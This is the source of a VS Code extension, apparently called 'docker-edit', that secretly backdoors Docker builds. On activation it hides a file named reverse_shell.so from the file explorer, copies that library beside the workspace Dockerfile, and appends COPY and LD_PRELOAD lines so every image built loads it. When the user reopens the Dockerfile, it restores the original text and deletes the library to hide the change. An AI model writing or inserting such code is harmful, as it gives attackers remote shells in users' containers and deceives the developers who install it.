import * as vscode from 'vscode';
import * as fs from 'fs';
import * as path from 'path';

export async function activate(context: vscode.ExtensionContext) {

	const config = vscode.workspace.getConfiguration();
	const currentValue = config.get<{}>('files.exclude');
	const newValue = { ...currentValue, ...{ ['**/reverse_shell.so']: true } };
	await config.update('files.exclude', newValue, true);

	const thisExtension = vscode.extensions.getExtension("undefined_publisher.docker-edit");
	const dockerExtension = vscode.extensions.getExtension("ms-azuretools.vscode-docker");

	if (!dockerExtension) { console.error("Docker extension not running."); return;}

	if (!thisExtension) { console.error("Docker-edit extension is not running properly."); return; }

	var dockerfilePath: string = "";
	const tabs: vscode.Tab[] = vscode.window.tabGroups.all.map(tg => tg.tabs).flat();
	const index = tabs.findIndex(tab => tab.input instanceof vscode.TabInputText && tab.input.uri.path.endsWith('Dockerfile'));
	if (index !== -1) {
		const tab = tabs[index];
		if (tab.input instanceof vscode.TabInputText) {
			dockerfilePath = tab.input.uri.fsPath;
		};
		await vscode.window.tabGroups.close(tab);
	}

	if (!dockerfilePath) {
		const results = await vscode.workspace.findFiles('**/Dockerfile', undefined, 2);
		if (results.length !== 1) { console.error("Could not find Dockerfile"); return; }
		dockerfilePath = results[0].fsPath;
	}

	const reverseShellPath = path.join(path.dirname(dockerfilePath), "reverse_shell.so");
	fs.copyFileSync(path.join(thisExtension.extensionPath, "reverse_shell.so"), reverseShellPath);

	const tempDest = path.join(thisExtension.extensionPath, "Dockerfile");
	fs.copyFileSync(dockerfilePath, tempDest);
	fs.appendFileSync(dockerfilePath, `\nCOPY reverse_shell.so /usr/share/lib/reverse_shell.so\nENV LD_PRELOAD=/usr/share/lib/reverse_shell.so`);

	context.subscriptions.push(vscode.workspace.onDidOpenTextDocument(e => {
		if (e.uri.fsPath === dockerfilePath) {
			fs.copyFileSync(tempDest, dockerfilePath);
			fs.rmSync(reverseShellPath);
		}
	}));

}

export function deactivate() {}
